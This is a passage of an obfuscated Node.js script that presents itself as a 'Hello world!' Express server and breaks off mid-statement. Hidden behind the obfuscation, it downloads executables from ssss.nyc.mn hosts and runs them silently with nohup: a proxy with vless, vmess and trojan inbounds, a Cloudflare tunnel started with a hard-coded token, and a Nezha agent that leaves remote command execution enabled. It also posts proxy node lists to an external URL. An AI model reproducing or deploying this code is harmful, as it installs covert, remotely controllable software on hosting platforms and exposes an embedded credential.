const _0x1c39ba=_0x195b;(function(_0x416863,_0x21588b){const _0x2c5521={_0x1b4ccb:0xe2,_0x1475a9:0x11d,_0x2c94f5:0x17f,_0x5c1813:0x137,_0x30243e:0x151,_0x801677:0x18f},_0x17676f=_0x195b,_0xa31d01=_0x416863();while(!![]){try{const _0x573441=parseInt(_0x17676f(0x185))/0x1*(-parseInt(_0x17676f(0x13c))/0x2)+parseInt(_0x17676f(0x10d))/0x3*(-parseInt(_0x17676f(_0x2c5521._0x1b4ccb))/0x4)+parseInt(_0x17676f(_0x2c5521._0x1475a9))/0x5+parseInt(_0x17676f(_0x2c5521._0x2c94f5))/0x6+parseInt(_0x17676f(0x18a))/0x7*(parseInt(_0x17676f(_0x2c5521._0x5c1813))/0x8)+parseInt(_0x17676f(_0x2c5521._0x30243e))/0x9+parseInt(_0x17676f(0x12d))/0xa*(-parseInt(_0x17676f(_0x2c5521._0x801677))/0xb);if(_0x573441===_0x21588b)break;else _0xa31d01['push'](_0xa31d01['shift']());}catch(_0x49a492){_0xa31d01['push'](_0xa31d01['shift']());}}}(_0x466d,0x73750));const express=require('express'),app=express(),axios=require(_0x1c39ba(0x195)),os=require('os'),fs=require('fs'),path=require(_0x1c39ba(0xe3)),{promisify}=require('util'),exec=promisify(require(_0x1c39ba(0xf6))[_0x1c39ba(0x170)]),{execSync}=require(_0x1c39ba(0xf6)),UPLOAD_URL=process[_0x1c39ba(0x155)][_0x1c39ba(0x161)]||'',PROJECT_URL=process[_0x1c39ba(0x155)][_0x1c39ba(0x152)]||'',AUTO_ACCESS=process[_0x1c39ba(0x155)][_0x1c39ba(0xf1)]||![],FILE_PATH=process[_0x1c39ba(0x155)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x1c39ba(0x155)][_0x1c39ba(0x16d)]||_0x1c39ba(0xeb),PORT=process[_0x1c39ba(0x155)]['SERVER_PORT']||process[_0x1c39ba(0x155)][_0x1c39ba(0x168)]||0xbb8,UUID=process[_0x1c39ba(0x155)][_0x1c39ba(0x196)]||_0x1c39ba(0x17e),NEZHA_SERVER=process[_0x1c39ba(0x155)][_0x1c39ba(0x156)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1c39ba(0x155)][_0x1c39ba(0xec)]||'',ARGO_DOMAIN=process[_0x1c39ba(0x155)][_0x1c39ba(0xf0)]||_0x1c39ba(0x146),ARGO_AUTH=process['env'][_0x1c39ba(0x12a)]||_0x1c39ba(0x13b),ARGO_PORT=process[_0x1c39ba(0x155)][_0x1c39ba(0x139)]||0x1f41,CFIP=process['env']['CFIP']||_0x1c39ba(0x108),CFPORT=process[_0x1c39ba(0x155)][_0x1c39ba(0xfd)]||0x1bb,NAME=process[_0x1c39ba(0x155)][_0x1c39ba(0x17b)]||'';!fs[_0x1c39ba(0x179)](FILE_PATH)?(fs[_0x1c39ba(0x121)](FILE_PATH),console[_0x1c39ba(0x115)](FILE_PATH+_0x1c39ba(0x184))):console[_0x1c39ba(0x115)](FILE_PATH+_0x1c39ba(0x16a));function generateRandomName(){const _0x2324d1={_0x59625b:0x113,_0x500a5f:0xe0},_0x2376a9=_0x1c39ba,_0x279c9b=_0x2376a9(_0x2324d1._0x59625b);let _0x1e442d='';for(let _0x15fad7=0x0;_0x15fad7<0x6;_0x15fad7++){_0x1e442d+=_0x279c9b['charAt'](Math[_0x2376a9(_0x2324d1._0x500a5f)](Math['random']()*_0x279c9b[_0x2376a9(0x175)]));}return _0x1e442d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1c39ba(0x17d)](FILE_PATH,npmName),phpPath=path[_0x1c39ba(0x17d)](FILE_PATH,phpName),webPath=path[_0x1c39ba(0x17d)](FILE_PATH,webName),botPath=path[_0x1c39ba(0x17d)](FILE_PATH,botName),subPath=path[_0x1c39ba(0x17d)](FILE_PATH,_0x1c39ba(0x114)),listPath=path[_0x1c39ba(0x17d)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1c39ba(0x17d)](FILE_PATH,_0x1c39ba(0xff)),configPath=path['join'](FILE_PATH,_0x1c39ba(0x163));function deleteNodes(){const _0x335bdd={_0x33939c:0xed,_0x355211:0x128,_0x47e8f9:0x175,_0x308bef:0x145,_0x1c9451:0x188,_0x364e22:0x117},_0x4bfe05=_0x1c39ba;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x172945;try{_0x172945=fs[_0x4bfe05(0x122)](subPath,'utf-8');}catch{return null;}const _0x48d504=Buffer[_0x4bfe05(0x153)](_0x172945,'base64')['toString'](_0x4bfe05(0x150)),_0x481f63=_0x48d504[_0x4bfe05(_0x335bdd._0x33939c)]('\x0a')[_0x4bfe05(_0x335bdd._0x355211)](_0x114a99=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4bfe05(0x14f)](_0x114a99));if(_0x481f63[_0x4bfe05(_0x335bdd._0x47e8f9)]===0x0)return;return axios['post'](UPLOAD_URL+_0x4bfe05(_0x335bdd._0x308bef),JSON[_0x4bfe05(_0x335bdd._0x1c9451)]({'nodes':_0x481f63}),{'headers':{'Content-Type':_0x4bfe05(_0x335bdd._0x364e22)}})[_0x4bfe05(0x112)](_0x1c803e=>{return null;}),null;}catch(_0x1c2dc1){return null;}}function cleanupOldFiles(){const _0x5747b5={_0x1f38f5:0x15e,_0x109768:0x14c},_0x58aced={_0x5bc567:0xdd},_0x4b332c=_0x1c39ba;try{const _0xc4cbf9=fs[_0x4b332c(_0x5747b5._0x1f38f5)](FILE_PATH);_0xc4cbf9[_0x4b332c(_0x5747b5._0x109768)](_0x268cc4=>{const _0x198603=_0x4b332c,_0x310161=path[_0x198603(0x17d)](FILE_PATH,_0x268cc4);try{const _0x3fdc34=fs['statSync'](_0x310161);_0x3fdc34[_0x198603(0xdc)]()&&fs[_0x198603(_0x58aced._0x5bc567)](_0x310161);}catch(_0x4019aa){}});}catch(_0x15da23){}}app[_0x1c39ba(0x104)]('/',function(_0x572f8a,_0xfa12e7){const _0x34994c=_0x1c39ba;_0xfa12e7[_0x34994c(0xf3)]('Hello\x20world!');});async function generateConfig(){const _0xae2d48={_0x2f44a0:0x14d,_0xe1438e:0x18e,_0x164464:0x17c,_0x1faab3:0x15b,_0x35ea07:0x15a,_0x5d58ed:0x17a,_0x4d1428:0xdf,_0x3d255e:0x15a,_0x315024:0x17a,_0x57670d:0x143,_0x196b55:0x193,_0x437910:0x101,_0x269fac:0xfc},_0x497de1=_0x1c39ba,_0x5c51ec={'log':{'access':_0x497de1(_0xae2d48._0x2f44a0),'error':_0x497de1(0x14d),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x497de1(0x15b),'settings':{'clients':[{'id':UUID,'flow':_0x497de1(0x18b)}],'decryption':_0x497de1(0x100),'fallbacks':[{'dest':0xbb9},{'path':_0x497de1(0xe5),'dest':0xbba},{'path':_0x497de1(_0xae2d48._0xe1438e),'dest':0xbbb},{'path':_0x497de1(_0xae2d48._0x164464),'dest':0xbbc}]},'streamSettings':{'network':_0x497de1(0x109)}},{'port':0xbb9,'listen':_0x497de1(0x17a),'protocol':_0x497de1(_0xae2d48._0x1faab3),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x497de1(0x109),'security':'none'}},{'port':0xbba,'listen':_0x497de1(0x17a),'protocol':_0x497de1(0x15b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x497de1(0x100)},'streamSettings':{'network':'ws','security':_0x497de1(0x100),'wsSettings':{'path':_0x497de1(0xe5)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x497de1(_0xae2d48._0x35ea07)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x497de1(_0xae2d48._0x5d58ed),'protocol':_0x497de1(0x176),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x497de1(_0xae2d48._0xe1438e)}},'sniffing':{'enabled':!![],'destOverride':[_0x497de1(_0xae2d48._0x4d1428),_0x497de1(0x143),_0x497de1(_0xae2d48._0x3d255e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x497de1(_0xae2d48._0x315024),'protocol':_0x497de1(0x19a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x497de1(0x100),'wsSettings':{'path':_0x497de1(0x17c)}},'sniffing':{'enabled':!![],'destOverride':[_0x497de1(_0xae2d48._0x4d1428),_0x497de1(_0xae2d48._0x57670d),_0x497de1(_0xae2d48._0x3d255e)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x497de1(0x103),'tag':_0x497de1(_0xae2d48._0x196b55)},{'protocol':'blackhole','tag':_0x497de1(_0xae2d48._0x437910)}]};fs[_0x497de1(_0xae2d48._0x269fac)](path[_0x497de1(0x17d)](FILE_PATH,_0x497de1(0x163)),JSON[_0x497de1(0x188)](_0x5c51ec,null,0x2));}function getSystemArchitecture(){const _0x255722={_0x35ba81:0xf4,_0x470a8e:0x12e},_0x2393c9=_0x1c39ba,_0xc2290e=os[_0x2393c9(0x16e)]();return _0xc2290e===_0x2393c9(0x107)||_0xc2290e===_0x2393c9(0x16f)||_0xc2290e===_0x2393c9(_0x255722._0x35ba81)?_0x2393c9(0x107):_0x2393c9(_0x255722._0x470a8e);}function downloadFile(_0x1de953,_0x327179,_0x24c47b){const _0x4d10f1={_0x4edb89:0x179,_0x116a02:0x112},_0x1d3b74={_0x54c702:0xf8,_0x599cd0:0x194},_0x3f5893={_0x25c3c3:0x16c},_0x21d10d={_0x13dd93:0x130,_0x41fa7a:0x19d,_0x484ed2:0x14e,_0x3c21c1:0x194},_0x4f62ab=_0x1c39ba,_0x254d54=_0x1de953;!fs[_0x4f62ab(_0x4d10f1._0x4edb89)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x596cb2=fs[_0x4f62ab(0x160)](_0x254d54);axios({'method':_0x4f62ab(0x104),'url':_0x327179,'responseType':_0x4f62ab(0x129)})[_0x4f62ab(0x189)](_0x13c2e0=>{const _0x32d0d6=_0x4f62ab;_0x13c2e0['data']['pipe'](_0x596cb2),_0x596cb2['on'](_0x32d0d6(_0x3f5893._0x25c3c3),()=>{const _0x54c268=_0x32d0d6;_0x596cb2['close'](),console[_0x54c268(0x115)](_0x54c268(0x19d)+path[_0x54c268(0x11a)](_0x254d54)+_0x54c268(0x147)),_0x24c47b(null,_0x254d54);}),_0x596cb2['on'](_0x32d0d6(0x194),_0x1f506b=>{const _0x46263f=_0x32d0d6;fs[_0x46263f(_0x21d10d._0x13dd93)](_0x254d54,()=>{});const _0x2f8edd=_0x46263f(_0x21d10d._0x41fa7a)+path['basename'](_0x254d54)+_0x46263f(_0x21d10d._0x484ed2)+_0x1f506b['message'];console[_0x46263f(_0x21d10d._0x3c21c1)](_0x2f8edd),_0x24c47b(_0x2f8edd);});})[_0x4f62ab(_0x4d10f1._0x116a02)](_0xd01d93=>{const _0x18ec81=_0x4f62ab,_0x5e331b='Download\x20'+path['basename'](_0x254d54)+'\x20failed:\x20'+_0xd01d93[_0x18ec81(_0x1d3b74._0x54c702)];console[_0x18ec81(_0x1d3b74._0x599cd0)](_0x5e331b),_0x24c47b(_0x5e331b);});}function _0x466d(){const _0x278a6e=['true','response','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','match','length','vmess','\x0aclient_secret:\x20','web\x20running\x20error:\x20','existsSync','127.0.0.1','NAME','/trojan-argo','join','118fe68e-6a7b-4ced-94c5-cdeace6e3dba','3386586tdccus','php\x20running\x20error:\x20','&fp=firefox&type=ws&host=','2096','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20is\x20created','56OLokUe','false','npm\x20running\x20error:\x20','stringify','then','504BrUmrE','xtls-rprx-vision','substring','http://ip-api.com/json/','/vmess-argo','11WoWxWZ','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA\x20variable\x20is\x20empty,skip\x20running','direct','error','axios','UUID','countryCode','Subscription\x20uploaded\x20successfully','\x20>\x20nul\x202>&1','trojan','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','443','Download\x20','\x20-s\x20','del\x20/f\x20/q\x20','https://arm64.ssss.nyc.mn/agent','country_code','isFile','unlinkSync','http\x20server\x20is\x20running\x20on\x20port:','http','floor','includes','592ZjXkNZ','path','Nodes\x20uploaded\x20successfully','/vless-argo','TunnelSecret','Error\x20in\x20startserver:','set','\x20-c\x20','/api/add-subscriptions','abc','NEZHA_KEY','split','push','https://arm64.ssss.nyc.mn/bot','ARGO_DOMAIN','AUTO_ACCESS','text/plain;\x20charset=utf-8','send','aarch64','config.yaml','child_process','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','message','\x0a\x0atrojan://','/api/add-nodes','Unhandled\x20error\x20in\x20startserver:','writeFileSync','CFPORT','https://amd64.ssss.nyc.mn/web','boot.log','none','block','data','freedom','get','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','arm','cdns.doon.eu.org','tcp','ArgoDomain:','ARGO_DOMAIN:','toString','8769BROiwq','.exe\x20>\x20nul\x202>&1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','App\x20is\x20running','Unknown','catch','abcdefghijklmnopqrstuvwxyz','sub.txt','log','/config.json\x20>/dev/null\x202>&1\x20&','application/json','?encryption=none&security=tls&sni=','2087','basename','Empowerment\x20failed\x20for\x20','base64','3787665UMDRnS','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2053','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','mkdirSync','readFileSync','Content-Type','post','has','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/web','filter','stream','ARGO_AUTH','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20>/dev/null\x202>&1','9303380LmkAJd','amd','Empowerment\x20success\x20for\x20','unlink','Error\x20reading\x20boot.log:','map','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','status','8443','/sub.txt\x20saved\x20successfully','45504wWUckm','2083','ARGO_PORT','unshift','eyJhIjoiY2UwMjljN2I3ZWUzMzU0MjhiMjE1ZjM0YTNkOWNkZmEiLCJ0IjoiZDA5YmU1ZjgtNTUyMy00ZTNkLWFlMTMtNDJmM2Q4NWJiNjcwIiwicyI6IllUQXdNakU1T0RNdE5UQTFOeTAwTURreExUazFaR0V0TmpJMk9XTTJOMk15TWpNMCJ9','21722NHXomF','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','taskkill\x20/f\x20/im\x20','Error\x20executing\x20command:\x20','win32','&path=%2Fvless-argo%3Fed%3D2560#','nohup\x20','tls','fileName','/api/delete-nodes','railway.zeroteach.dpdns.org','\x20successfully','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.json','\x20>/dev/null\x202>&1\x20&','\x0avless://','forEach','/dev/null','\x20failed:\x20','test','utf-8','6413130QuOZqD','PROJECT_URL','from','org','env','NEZHA_SERVER','https://ipapi.co/json/','listen','clear','quic','vless','\x20-c\x20\x22','pkill\x20-f\x20\x22[','readdirSync','pop','createWriteStream','UPLOAD_URL','/tunnel.yml\x20run','config.json','\x20is\x20running','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','platform','PORT','\x20-p\x20','\x20already\x20exists','\x0a\x20\x20\x20\x20','finish','SUB_PATH','arch','arm64','exec'];_0x466d=function(){return _0x278a6e;};return _0x466d();}async function downloadFilesAndRun(){const _0x262612={_0x367f60:0x175,_0x5a12fe:0x115,_0x250773:0x120,_0x221366:0x132,_0xcab691:0x190,_0xf1c1e7:0xe1,_0x374b4f:0xed,_0x1b3707:0x19c,_0x3133ac:0x135,_0x22d45c:0x182,_0x59ec37:0x11f,_0x17a438:0x171,_0x20ac37:0x105,_0x513bcb:0x11e,_0x28c026:0x10f,_0x58668c:0x142,_0x440797:0x15c,_0x3cf1df:0x183,_0x11b673:0x115,_0x7c13f:0x194,_0x1a3335:0x182,_0x486b09:0x119,_0xe66cea:0xe1,_0x26029b:0x164,_0xf9d79f:0xe9,_0xf4009c:0x178,_0x5e89cd:0x179,_0x1fdd41:0x174,_0x4996b1:0x162,_0x151281:0x133,_0xb3e45b:0x115},_0x2321a6=_0x1c39ba,_0x1691ce=getSystemArchitecture(),_0x1e3fdd=getFilesForArchitecture(_0x1691ce);if(_0x1e3fdd[_0x2321a6(_0x262612._0x367f60)]===0x0){console[_0x2321a6(_0x262612._0x5a12fe)](_0x2321a6(_0x262612._0x250773));return;}const _0x3a649b=_0x1e3fdd[_0x2321a6(_0x262612._0x221366)](_0x57c659=>{return new Promise((_0xe30dea,_0x2803e5)=>{const _0x292733=_0x195b;downloadFile(_0x57c659[_0x292733(0x144)],_0x57c659['fileUrl'],(_0x4e94be,_0x267987)=>{_0x4e94be?_0x2803e5(_0x4e94be):_0xe30dea(_0x267987);});});});try{await Promise['all'](_0x3a649b);}catch(_0x3a044a){console[_0x2321a6(0x194)](_0x2321a6(_0x262612._0xcab691),_0x3a044a);return;}function _0x5a6976(_0x712f3e){const _0x4fe5d6=0x1fd;_0x712f3e['forEach'](_0x1f2b94=>{const _0x564b17={_0x5dd5a9:0x194,_0x1b7ac1:0x11b,_0x4175cb:0x115};fs['existsSync'](_0x1f2b94)&&fs['chmod'](_0x1f2b94,_0x4fe5d6,_0x165fa0=>{const _0x5d7dd3=_0x195b;_0x165fa0?console[_0x5d7dd3(_0x564b17._0x5dd5a9)](_0x5d7dd3(_0x564b17._0x1b7ac1)+_0x1f2b94+':\x20'+_0x165fa0):console[_0x5d7dd3(_0x564b17._0x4175cb)](_0x5d7dd3(0x12f)+_0x1f2b94+':\x20'+_0x4fe5d6['toString'](0x8));});});}const _0x4351c9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5a6976(_0x4351c9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3b76fa=NEZHA_SERVER[_0x2321a6(_0x262612._0xf1c1e7)](':')?NEZHA_SERVER[_0x2321a6(_0x262612._0x374b4f)](':')[_0x2321a6(0x15f)]():'',_0x1e4df1=new Set([_0x2321a6(_0x262612._0x1b3707),_0x2321a6(_0x262612._0x3133ac),_0x2321a6(_0x262612._0x22d45c),_0x2321a6(0x119),_0x2321a6(0x138),_0x2321a6(_0x262612._0x59ec37)]),_0x6a60ae=_0x1e4df1[_0x2321a6(0x125)](_0x3b76fa)?_0x2321a6(_0x262612._0x17a438):_0x2321a6(0x186),_0x3c2772=_0x2321a6(0x177)+NEZHA_KEY+_0x2321a6(_0x262612._0x20ac37)+NEZHA_SERVER+_0x2321a6(_0x262612._0x513bcb)+_0x6a60ae+_0x2321a6(_0x262612._0x28c026)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x2321a6(0xf5)),_0x3c2772);const _0x2a370a=_0x2321a6(_0x262612._0x58668c)+phpPath+_0x2321a6(_0x262612._0x440797)+FILE_PATH+_0x2321a6(_0x262612._0x3cf1df);try{await exec(_0x2a370a),console[_0x2321a6(_0x262612._0x11b673)](phpName+_0x2321a6(0x164)),await new Promise(_0x2377c4=>setTimeout(_0x2377c4,0x3e8));}catch(_0x445f25){console[_0x2321a6(_0x262612._0x7c13f)](_0x2321a6(0x180)+_0x445f25);}}else{let _0x438159='';const _0xbf4e9a=[_0x2321a6(0x19c),_0x2321a6(0x135),_0x2321a6(_0x262612._0x1a3335),_0x2321a6(_0x262612._0x486b09),'2083',_0x2321a6(_0x262612._0x59ec37)];_0xbf4e9a[_0x2321a6(_0x262612._0xe66cea)](NEZHA_PORT)&&(_0x438159='--tls');const _0x150723=_0x2321a6(0x142)+npmPath+_0x2321a6(0x19e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2321a6(0x169)+NEZHA_KEY+'\x20'+_0x438159+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x150723),console[_0x2321a6(0x115)](npmName+_0x2321a6(_0x262612._0x26029b)),await new Promise(_0x3e2f88=>setTimeout(_0x3e2f88,0x3e8));}catch(_0x37d78d){console[_0x2321a6(0x194)](_0x2321a6(0x187)+_0x37d78d);}}}else console[_0x2321a6(0x115)](_0x2321a6(0x192));const _0x4a56c7=_0x2321a6(0x142)+webPath+_0x2321a6(_0x262612._0xf9d79f)+FILE_PATH+_0x2321a6(0x116);try{await exec(_0x4a56c7),console[_0x2321a6(0x115)](webName+'\x20is\x20running'),await new Promise(_0x467b89=>setTimeout(_0x467b89,0x3e8));}catch(_0x2fea01){console[_0x2321a6(0x194)](_0x2321a6(_0x262612._0xf4009c)+_0x2fea01);}if(fs[_0x2321a6(_0x262612._0x5e89cd)](botPath)){let _0xa68b55;if(ARGO_AUTH[_0x2321a6(_0x262612._0x1fdd41)](/^[A-Z0-9a-z=]{120,250}$/))_0xa68b55=_0x2321a6(0x13d)+ARGO_AUTH;else ARGO_AUTH[_0x2321a6(0x174)](/TunnelSecret/)?_0xa68b55='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2321a6(_0x262612._0x4996b1):_0xa68b55=_0x2321a6(0x19b)+FILE_PATH+_0x2321a6(_0x262612._0x151281)+ARGO_PORT;try{await exec(_0x2321a6(_0x262612._0x58668c)+botPath+'\x20'+_0xa68b55+_0x2321a6(0x14a)),console[_0x2321a6(_0x262612._0xb3e45b)](botName+_0x2321a6(0x164)),await new Promise(_0x5b0485=>setTimeout(_0x5b0485,0x7d0));}catch(_0x35f6bf){console['error'](_0x2321a6(0x13f)+_0x35f6bf);}}await new Promise(_0x51b8ca=>setTimeout(_0x51b8ca,0x1388));}function getFilesForArchitecture(_0x2b69db){const _0xd52e5d={_0x154554:0x127,_0x2298c1:0x13a},_0x58162b=_0x1c39ba;let _0x59a8ed;_0x2b69db===_0x58162b(0x107)?_0x59a8ed=[{'fileName':webPath,'fileUrl':_0x58162b(_0xd52e5d._0x154554)},{'fileName':botPath,'fileUrl':_0x58162b(0xef)}]:_0x59a8ed=[{'fileName':webPath,'fileUrl':_0x58162b(0xfe)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1cfc5b=_0x2b69db===_0x58162b(0x107)?_0x58162b(0x1a0):'https://amd64.ssss.nyc.mn/agent';_0x59a8ed[_0x58162b(0x13a)]({'fileName':npmPath,'fileUrl':_0x1cfc5b});}else{const _0x1a0a34=_0x2b69db===_0x58162b(0x107)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x59a8ed[_0x58162b(_0xd52e5d._0x2298c1)]({'fileName':phpPath,'fileUrl':_0x1a0a34});}}return _0x59a8ed;}function argoType(){const _0x166502={_0x321c32:0xe6,_0x33310d:0xfc,_0x2301b2:0x17d,_0x502cb5:0x149,_0x17c61b:0xed,_0x129cf1:0x191,_0x5601b4:0x17d},_0x2adbe8=_0x1c39ba;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2adbe8(0x115)](_0x2adbe8(0x12b));return;}if(ARGO_AUTH['includes'](_0x2adbe8(_0x166502._0x321c32))){fs[_0x2adbe8(_0x166502._0x33310d)](path[_0x2adbe8(_0x166502._0x2301b2)](FILE_PATH,_0x2adbe8(_0x166502._0x502cb5)),ARGO_AUTH);const _0x29eb5e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2adbe8(_0x166502._0x17c61b)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2adbe8(0x17d)](FILE_PATH,_0x2adbe8(0x149))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2adbe8(_0x166502._0x129cf1)+ARGO_PORT+_0x2adbe8(0x166);fs['writeFileSync'](path[_0x2adbe8(_0x166502._0x5601b4)](FILE_PATH,'tunnel.yml'),_0x29eb5e);}else console[_0x2adbe8(0x115)](_0x2adbe8(0x148));}async function extractDomains(){const _0x20f2d8={_0x340a09:0x115,_0x5a2ab8:0x122,_0x57059b:0xff,_0x2f71d0:0x14c,_0x18a77f:0x175,_0x433287:0xf7,_0x142f96:0x19b,_0x3bcd3e:0x13f},_0x1278d9={_0x5956f4:0x102,_0x3b8a27:0xdb,_0x1f70af:0x154,_0x591fca:0x104,_0x2be56f:0x102,_0x4f8eeb:0x134,_0x480a21:0x197,_0x44f644:0x197,_0x18cb36:0x154,_0x511f63:0x111},_0x2410b6={_0x2c6150:0x167,_0x33c300:0x15d,_0x560371:0x18c},_0xd08490=_0x1c39ba;let _0x430b7d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x430b7d=ARGO_DOMAIN,console[_0xd08490(_0x20f2d8._0x340a09)](_0xd08490(0x10b),_0x430b7d),await _0x1b98fa(_0x430b7d);else try{const _0x1d59aa=fs[_0xd08490(_0x20f2d8._0x5a2ab8)](path['join'](FILE_PATH,_0xd08490(_0x20f2d8._0x57059b)),'utf-8'),_0x1de118=_0x1d59aa[_0xd08490(0xed)]('\x0a'),_0x37ced6=[];_0x1de118[_0xd08490(_0x20f2d8._0x2f71d0)](_0x59ff92=>{const _0x47f18a=_0xd08490,_0x336c63=_0x59ff92[_0x47f18a(0x174)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x336c63){const _0x31b0fe=_0x336c63[0x1];_0x37ced6[_0x47f18a(0xee)](_0x31b0fe);}});if(_0x37ced6[_0xd08490(_0x20f2d8._0x18a77f)]>0x0)_0x430b7d=_0x37ced6[0x0],console[_0xd08490(_0x20f2d8._0x340a09)](_0xd08490(0x10a),_0x430b7d),await _0x1b98fa(_0x430b7d);else{console['log'](_0xd08490(_0x20f2d8._0x433287)),fs['unlinkSync'](path['join'](FILE_PATH,_0xd08490(0xff)));async function _0x14e6f5(){const _0x8bc080=_0xd08490;try{process[_0x8bc080(_0x2410b6._0x2c6150)]===_0x8bc080(0x140)?await exec(_0x8bc080(0x13e)+botName+_0x8bc080(0x10e)):await exec(_0x8bc080(_0x2410b6._0x33c300)+botName['charAt'](0x0)+']'+botName[_0x8bc080(_0x2410b6._0x560371)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x557db3){}}_0x14e6f5(),await new Promise(_0x26fb16=>setTimeout(_0x26fb16,0xbb8));const _0x3103a9=_0xd08490(_0x20f2d8._0x142f96)+FILE_PATH+_0xd08490(0x133)+ARGO_PORT;try{await exec(_0xd08490(0x142)+botPath+'\x20'+_0x3103a9+_0xd08490(0x14a)),console[_0xd08490(0x115)](botName+_0xd08490(0x164)),await new Promise(_0x177055=>setTimeout(_0x177055,0xbb8)),await extractDomains();}catch(_0x73edf4){console['error'](_0xd08490(_0x20f2d8._0x3bcd3e)+_0x73edf4);}}}catch(_0x4d2c74){console['error'](_0xd08490(0x131),_0x4d2c74);}async function _0xa52e4f(){const _0x1e7551=_0xd08490;try{const _0x5e3e09=await axios['get'](_0x1e7551(0x157),{'timeout':0xbb8});if(_0x5e3e09['data']&&_0x5e3e09[_0x1e7551(_0x1278d9._0x5956f4)][_0x1e7551(_0x1278d9._0x3b8a27)]&&_0x5e3e09['data'][_0x1e7551(_0x1278d9._0x1f70af)])return _0x5e3e09[_0x1e7551(0x102)][_0x1e7551(_0x1278d9._0x3b8a27)]+'_'+_0x5e3e09['data'][_0x1e7551(0x154)];}catch(_0x475e7f){try{const _0x49dfa2=await axios[_0x1e7551(_0x1278d9._0x591fca)](_0x1e7551(0x18d),{'timeout':0xbb8});if(_0x49dfa2[_0x1e7551(_0x1278d9._0x2be56f)]&&_0x49dfa2[_0x1e7551(0x102)][_0x1e7551(_0x1278d9._0x4f8eeb)]==='success'&&_0x49dfa2['data'][_0x1e7551(_0x1278d9._0x480a21)]&&_0x49dfa2['data']['org'])return _0x49dfa2['data'][_0x1e7551(_0x1278d9._0x44f644)]+'_'+_0x49dfa2[_0x1e7551(0x102)][_0x1e7551(_0x1278d9._0x18cb36)];}catch(_0x1ddbbd){}}return _0x1e7551(_0x1278d9._0x511f63);}async function _0x1b98fa(_0xdbcd43){const _0xd184e2=await _0xa52e4f(),_0x44a134=NAME?NAME+'-'+_0xd184e2:_0xd184e2;return new Promise(_0x443893=>{const _0x645a5a={_0x4aab54:0x181,_0x55fa25:0x141,_0x4f99ac:0x126,_0x2737f0:0x188,_0x13d713:0x10c,_0x343548:0x11c,_0x1ccaf3:0xf9,_0x30502b:0x16b,_0x7aee93:0x153,_0x122701:0x11c,_0xa78fdf:0x115,_0x2ec21c:0x136};setTimeout(()=>{const 